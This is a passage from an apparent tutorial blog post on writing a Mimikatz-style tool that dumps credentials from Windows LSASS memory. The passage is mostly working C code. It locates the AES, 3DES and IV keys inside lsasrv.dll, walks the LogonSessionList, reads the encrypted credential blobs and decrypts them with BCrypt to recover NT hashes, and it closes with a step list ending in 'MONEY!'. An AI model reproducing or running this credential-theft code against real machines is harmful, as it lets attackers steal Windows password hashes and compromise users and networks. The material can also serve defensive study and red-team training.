	printf("Could not retr AES Offset to BCRYPT_KEY_HANDLE");
	return;
}
if (!ReadProcessMemory(hTarget, ((BYTE*)pKeyBase - DESKeyOffset), &hDesKeyOffset, sizeof(int32_t), &written)) {
	printf("Could not retr DES Offset to BCRYPT_KEY_HANDLE");
	return;
}
if (!ReadProcessMemory(hTarget, ((BYTE*)pKeyBase + IVOffset), &IVRelativeOffset, sizeof(int32_t), &written)) {
	printf("Could not retr DES Offset to BCRYPT_KEY_HANDLE");
	return;
}
```


Keep in mind that we're applying each types offset to the base address, and also dont forget that the DES address is negative.

Then from here we can apply the relative offset from the next instruction, exactly like we did for the LogonSessionList.  

```c

	PKIWI_BCRYPT_HANDLE_KEY hAesKeyRemote = NULL;
	PKIWI_BCRYPT_HANDLE_KEY hDesKeyRemote = NULL; // remote address of struct

	if (!ReadProcessMemory(hTarget, ((BYTE*)pKeyBase + AESKeyOffset + 4 + hAesKeyOffset), &hAesKeyRemote, sizeof(hAesKeyRemote), &written)) {
		printf("Could not retr AES Offset to BCRYPT_KEY_HANDLE");
		return;
	}
	if (!ReadProcessMemory(hTarget, ((BYTE*)pKeyBase - DESKeyOffset + 4 + hDesKeyOffset), &hDesKeyRemote, sizeof(hDesKeyRemote), &written)) {
		printf("Could not retr AES Offset to BCRYPT_KEY_HANDLE");
		return;
	}
	if (!ReadProcessMemory(hTarget, ((BYTE*)pKeyBase + IVOffset + 4 + IVRelativeOffset), &IV, sizeof(IV), &written)) {
		printf("Could not retr AES Offset to BCRYPT_KEY_HANDLE");
		return;
	}
	printf("AES Key Retr in LSASS @ 0x%p\n", hAesKeyRemote);
	printf("DES Key Retr in LSASS @ 0x%p\n", hDesKeyRemote);
```

But why is this one only adding 4, and not 7 like last time? Here this is because the offset calculated by Mimikatz takes us up EXACTLY to the offset.

What we see in ghidra and the unassembler is:

```
lea rdx, [rip + 0013bfef]
-------------------------------------
48 8d 15 [ ef bf 13 00 ] | [] = Where Mimikatz takes you
```
![asm](attachments/Pasted%20image%2020250903214604.png)

And so we're adding 4 so that we just straight to the first index of the red box.  Keep in mind the endianness of whats written in the assembler versus the interpreted version, hence why it may look out of order at first glance.

When we were finding LogonSessionList our code would find the offset by treating the entire assembly code as an array, but skipping over the first 3 opcodes.  Then it would apply the offset to the beggining since it wasnt storing any addresses between the opcodes and the relative address.

So now that we have our relative address we have the full pointer to our key objects  at `((BYTE*)pKeyBase + IVOffset + 4 + IVRelativeOffset)`.

We read that address and have the structures in local memory now.

```c
	//read pointer to remote key handle -> local memory
	KIWI_BCRYPT_HANDLE_KEY hAesKeyHandlLocal;
	KIWI_BCRYPT_HANDLE_KEY hDesKeyHandleLocal;
	if (!ReadProcessMemory(hTarget, hAesKeyRemote, &hAesKeyHandlLocal, sizeof(hAesKeyHandlLocal), &written)) {
		printf("Could not retr AES Offset to BCRYPT_KEY_HANDLE");
		return;
	}
	if (!ReadProcessMemory(hTarget, hDesKeyRemote, &hDesKeyHandleLocal, sizeof(hDesKeyHandleLocal), &written)) {
		printf("Could not retr AES Offset to BCRYPT_KEY_HANDLE");
		return;
	}
```

And now we need to go within this structure to find the `KIWI_BCRYPT_KEY81` so we can eventually find the `KIWI_HARD_KEY`

Keep in mind that the `KIWI_BCRYPT_HANDLE_KEY` structure just stores a pointer to `KIWI_BCRYPT_KEY81` so we read that memory address and pull it back into local memory.


```c
KIWI_BCRYPT_KEY81 aes81Key;
KIWI_BCRYPT_KEY81 des81Key;


if (!ReadProcessMemory(hTarget, hAesKeyHandlLocal.key, &aes81Key, sizeof(KIWI_BCRYPT_KEY81), &written)) {
	printf("Could not retr AES81 Key");
	return;
}
if (!ReadProcessMemory(hTarget, hDesKeyHandleLocal.key, &des81Key, sizeof(KIWI_BCRYPT_KEY81), &written)) {
	printf("Could not retr AES81 Key");
	return;
}
```

And now the `KIWI_BCRYPT_KEY81` has the entire `KIWI_HARD_KEY` structure stored within it, not another pointer.  This means we can directly reference it now that its in local memory.

```c
BYTE AESKeyBytes[AESKeySize]; // should this be sized to cbSecret?
BYTE DESKeyBytes[DESKeySize];

memcpy(AESKeyBytes, aes81Key.hardkey.data,aes81Key.hardkey.cbSecret);
memcpy(DESKeyBytes, des81Key.hardkey.data, des81Key.hardkey.cbSecret);

//memcpy(DESKeyBytes, des81Key.hardkey.data, des81Key.hardkey.cbSecret);

//now we should have the AES & DES Keys

printKeyBytes(AESKeyBytes, aes81Key.hardkey.cbSecret, "AES KEY");
printKeyBytes(DESKeyBytes, des81Key.hardkey.cbSecret, "DES KEY");
printKeyBytes(IV, sizeof(IV), "Initialization Vector");

//printKeyBytes(DESKeyBytes, des81Key.hardkey.cbSecret, "DES KEY");

memcpy(keysOut->AESKey, AESKeyBytes, aes81Key.hardkey.cbSecret);
memcpy(keysOut->DESKey, DESKeyBytes, des81Key.hardkey.cbSecret);
memcpy(keysOut->IVKey, IV, sizeof(IV));

keysOut->AESKeyLen = AESKeySize;
keysOut->DESKeyLen = DESKeySize;
keysOut->IVKeyLen = sizeof(IV);

```

Here is where we're at:
1. Create driver ✔️
2. Load driver ✔️
3. Unprotect lsass ✔️
4. Get lsass process handle ✔️
5. Find lsasrv.dll in lsass memory space ✔️
6. Find `LogonSessionList` pattern match address in lsasrv.dll✔️
7. Find AES/DES/IV Key pattern match address in lsasrv.dll ✔️
8. 9. Extract AES / DES / IV Keys✔️
9. Read through LogonSessionList for encrypted security blobs
10. Decrypt encrypted security blob
11. MONEY!

Just a little bit more everyone!
## Reading Security Blobs

We looped through the LogonSessionList when we printed usernames, so we're going to use a very similar process.  If this part still confuses you, I recommend re-reading that section or checking out the pykd article linked above!

The only difference in this first part is that we're finding our keys, which we just talked about above.

```c

void getSecurityBlob(HANDLE hTarget, PVOID pLogonSessionList, PVOID pKeysBase) {


	ENC_KEYS keys = { 0 };
	findKeys(hTarget, pKeysBase, &keys);


	// Step 1: read the head pointer (points into LSASS memory)
	PKIWI_MSV1_0_LIST_63 headPtr = NULL;
	if (!ReadProcessMemory(hTarget, pLogonSessionList, &headPtr, sizeof(headPtr), NULL) || !headPtr) {
		printf("[-] Failed to read head pointer\n");
		return;
	}

	// Step 2: read the head node structure
	KIWI_MSV1_0_LIST_63 head = { 0 };
	if (!ReadProcessMemory(hTarget, headPtr, &head, sizeof(head), NULL)) {
		printf("[-] Failed to read head struct\n");
		return;
	}
	// Step 3: iterate the linked list
	PKIWI_MSV1_0_LIST_63 current = head.Flink;
	while (current && current != headPtr) {
		KIWI_MSV1_0_LIST_63 node = { 0 };
		if (!ReadProcessMemory(hTarget, current, &node, sizeof(node), NULL)) {
			printf("[-] Failed to read node @ %p\n", current);
			break;
		}
		printf("\n\nLOCAL KIWI STRUCT 0x%p\n", &node);
```

We pull retrieve our LogonSessionList pointer from remote memeory, and store it locally.  Then we read the LogonSessionList head at that remote memory address and store it locally.  Then save the head list address, and begin looping through all of the different LogonSessionList entries.

Now we can access the pointer to the `KIWI_MSV1_0_CREDENTIALS Credentials` so we pull that

```c
printf("Attempting to read security blob\n");
if (node.Credentials) { // base + 0x108
	printf("Pointer to KIWI_MSV1_0_CREDENTIALS found at: 0x%p\n", node.Credentials);
	KIWI_MSV1_0_CREDENTIALS Credentials = { 0 };
	if (ReadProcessMemory(hTarget, node.Credentials, &Credentials, sizeof(KIWI_MSV1_0_CREDENTIALS), NULL)) { //place struct in at this address
		printf("REMOTE Pointer to KIWI_MSV1_0_CREDENTIALS found at: 0x%p\n", node.Credentials);
		printf("local Pointer to KIWI_MSV1_0_CREDENTIALS found at: 0x%p\n", &Credentials);

		//read local address for new pointer
		PKIWI_MSV1_0_PRIMARY_CREDENTIALS pPrimaryCredentials = Credentials.PrimaryCredentials;
		KIWI_MSV1_0_PRIMARY_CREDENTIALS PrimaryCredentials = { 0 };
		getchar();
```

With the `KIWI_MSV1_0_CREDENTIALS` structure we can get a remote pointer to the `KIWI_MSV1_0_PRIMARY_CREDENTIALS` structure so we pull that and store the pointer inside of `pPrimaryCredentials`.  We also initialize a new struct to hold the contents of that struct once we read it here:

```c
	if (ReadProcessMemory(hTarget, pPrimaryCredentials, &PrimaryCredentials, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS), NULL)) {
					LSA_UNICODE_STRING LsaUnicodeString = PrimaryCredentials.Credentials;
```

Now we have a local copy of lsass's `KIWI_MSV1_0_PRIMARY_CREDENTIALS` structure.  This contains the `LSA_UNICODE_STRING` structure which has a remote pointer in lsass to the encrypted blob, so we read lsass's memory for the encrypted blob.

```c
	if (LsaUnicodeString.Length > 0 && LsaUnicodeString.Buffer) {
					SIZE_T blobSize = LsaUnicodeString.Length; // already in bytes
					BYTE* blob = (BYTE*)malloc(blobSize);
					if (blob) {
						if (ReadProcessMemory(hTarget, LsaUnicodeString.Buffer, blob, blobSize, NULL)) {
							printf("[+] Security Blob (%llu bytes)\n", (unsigned long long)blobSize);
```

For debugging purposes you can print out the hex, it makes it easy to tell once you have a decrypted blob and actually pull out useful data.

Then we just need to decrypt the blob.

```c
								// Optionally print as hex
								for (SIZE_T i = 0; i < blobSize; i++)
									printf("%02X ", blob[i]);
								printf("\n");

								printf("Entering Decrypt routine...\n");
								decryptBlob(blob, blobSize, keys);
```

## Blob Decryption

Like we saw earlier, we know that BCrypt is the primary cryptograph driver of lsass's credentials stored in memory.  We even saw the different algorithms and BCrypt properties used by lsass in Ghidra.

![bcrypt](attachments/Pasted%20image%2020250903221846.png)

Here's what we know based on the decomplication of lsasrv.dll

**[BCryptSetProperty](https://learn.microsoft.com/en-us/windows/win32/api/bcrypt/nf-bcrypt-bcryptsetproperty):**

| Field                                                                                                                                     | AES               | 3DES              |
| ----------------------------------------------------------------------------------------------------------------------------------------- | ----------------- | ----------------- |
| [Cryptography Primitive Property Identifier (Bcrypt.h) ](https://learn.microsoft.com/en-us/windows/win32/SecCNG/cng-property-identifiers) | Chaining Mode CFB | Chaining Mode CBC |

The other unique thing that Adam Chester discovered, is when each algorithm is used. He was able to determine that AES is used when the length of the security blob is divisible by 8, AES is used.

So now we can start writing code:

```c

void decryptBlob(const BYTE* blob, SIZE_T blobLen, ENC_KEYS keys) {
	SECURITY_BLOB secBlob = { 0 };
	printKeyBytes(blob, (SIZE_T)blobLen, "BLOB\n");
	///////

	BCRYPT_ALG_HANDLE algAESHandle = 0;
	BCRYPT_ALG_HANDLE algDESHandle = 0;

	BCRYPT_KEY_HANDLE hAESKey;
	BCRYPT_KEY_HANDLE hDESKey;

	ULONG resultLen = 0;

	BYTE ivCopyAES[16];
	memcpy(ivCopyAES, keys.IVKey, 16);

	BYTE ivCopyDES[8];
	memcpy(ivCopyDES, keys.IVKey, 8);

	unsigned char HASH[1024];
	ULONG LenHASH = sizeof(HASH);
	char buf[1024];

	NTSTATUS bcryptResult;
```

We need copies of the IV because when we start decrypting the blobs BCrypt will make changes to the IV.  The IV for AES is 16 bytes.  The IV for DES is 8 bytes which mimikatz confirms.

[mimikatz/mimilib/sekurlsadbg/kuhl_m_sekurlsa_nt6.c at 152b208916c27d7d1fc32d10e64879721c4d06af · gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz/blob/152b208916c27d7d1fc32d10e64879721c4d06af/mimilib/sekurlsadbg/kuhl_m_sekurlsa_nt6.c#L9)

![mim2](attachments/Pasted%20image%2020250903222257.png)

This code also clues us in on the fact that we should be making IV copies because of the changes BCrypt will make to the original, and if the blob size is divisible by 8, so without Adam Chester's article this is another way you could confirm this without needing to fully reverse lsasrv.dll.
```c
printf("Checking if AES or DES..\n");
if (blobLen  % 8 != 0) {
```

This if statement checks to see if the blob length is divisible by 8.

```c
if (blobLen  % 8 != 0) {
	printf("AES Selected.\n");

	bcryptResult = BCryptOpenAlgorithmProvider(&algAESHandle, BCRYPT_AES_ALGORITHM, 0, 0);
	if (!NT_SUCCESS(bcryptResult)) {
		printf("Cannot open alg provider\n");
	}
	printf("Alg handle made.\n");

	bcryptResult = BCryptSetProperty(algAESHandle, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CFB, sizeof(BCRYPT_CHAIN_MODE_CFB), 0);

	if (!NT_SUCCESS(bcryptResult)) {
		printf("Cannot set cahining mode CFB\n");
	}
	printf("Set properties\n");

	bcryptResult = BCryptGenerateSymmetricKey(algAESHandle, &hAESKey, NULL, 0, keys.AESKey, keys.AESKeyLen, 0);

	if (!NT_SUCCESS(bcryptResult)) {
		printf("Cannot create symmetric key based on found key\n");
	}
	printf("Symmetric Key generated\n");

	bcryptResult = BCryptDecrypt(hAESKey, (PUCHAR)blob, blobLen, NULL, ivCopyAES, sizeof(ivCopyAES), HASH, LenHASH, &resultLen, 0);
	printf("Decrypted Lsaunicode string buffer\n");

	if (!NT_SUCCESS(bcryptResult)) {
		printf("Cannot open decrypt hash\n");
	}
	if (hAESKey) BCryptDestroyKey(hAESKey);
	if (algAESHandle) BCryptCloseAlgorithmProvider(algAESHandle, 0);
} else {
```

If so we enter the decryption routine which is a fairly well documented process that is largely plug and play. We made our own algorithm handles so we populate those, set the appropriate modes we found in Ghidra, generate a symmetric key based on the secret we found, and then decrypt the blob.  The same is true of DES:

```c
 else {
		printf("DES Selected.\n");

		bcryptResult = BCryptOpenAlgorithmProvider(&algDESHandle, BCRYPT_3DES_ALGORITHM, 0, 0);
		if (!NT_SUCCESS(bcryptResult)) {
			printf("Cannot open alg provider\n");
		}
		printf("Alg handle made.\n");

		bcryptResult = BCryptSetProperty(algDESHandle, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);

		if (!NT_SUCCESS(bcryptResult)) {
			printf("Cannot set cahining mode CBC\n");
		}
		printf("Set property .\n");

		bcryptResult = BCryptGenerateSymmetricKey(algDESHandle, &hDESKey, NULL, 0, keys.DESKey, keys.DESKeyLen, 0);

		if (!NT_SUCCESS(bcryptResult)) {
			printf("Cannot create symmetric key based on found key\n");
		}
		printf("Genned sym key .\n");
		printf("Trying to decrypt... please../..\n");

		bcryptResult = BCryptDecrypt(hDESKey, (PUCHAR)blob, blobLen, 0, ivCopyDES, sizeof(ivCopyDES), HASH, LenHASH, &resultLen, 0);
		//		bcryptResult = BCryptDecrypt(hDESKey, (PUCHAR)LsaUnicodeString.Buffer, LsaUnicodeString.Length, 0, keys.IVKey, 8, HASH, LenHASH, &LenHASH, 0);
		if (!NT_SUCCESS(bcryptResult)) {
			printf("Cannot open decrypt hash\n");
		}
		printf("Decryoted hash...\n");

	}
```

Then from here we just need to print our decrypted blob!

```c
if (!NT_SUCCESS(bcryptResult)) {
	printf("Decrypt failed: 0x%x\n", bcryptResult);
}
else {
	printf("Decrypted %lu bytes.\n", resultLen);
	wprintf(L"Decrypted (as string): %.*ls\n", resultLen / 2, (wchar_t*)HASH);
	printKeyBytes(HASH, resultLen, "Decrypted blob (hex):");
}
```

![decrypt](attachments/Pasted%20image%2020250903223038.png)

For reference I do not have a password set on this machine.  Here you can see that an empty password field as an NT hash matches perfectly with the decrypted output above!

![fin1](attachments/Pasted%20image%2020250903223133.png)

![fin2](attachments/Pasted%20image%2020250903224011.png)

![fin3](attachments/Pasted%20image%2020250903224003.png)

1. Create driver ✔️
2. Load driver ✔️
3. Unprotect lsass ✔️
4. Get lsass process handle ✔️
5. Find lsasrv.dll in lsass memory space ✔️
6. Find `LogonSessionList` pattern match address in lsasrv.dll✔️
7. Find AES/DES/IV Key pattern match address in lsasrv.dll ✔️
8. 9. Extract AES / DES / IV Keys✔️
9. Read through LogonSessionList for encrypted security blobs✔️
10. Decrypt encrypted security blob✔️
11. MONEY!✔️

So there you have it!  Pulling hashes and username from lsass!  Hopefully this was helpful!  I've wanted to make something like this for a while!

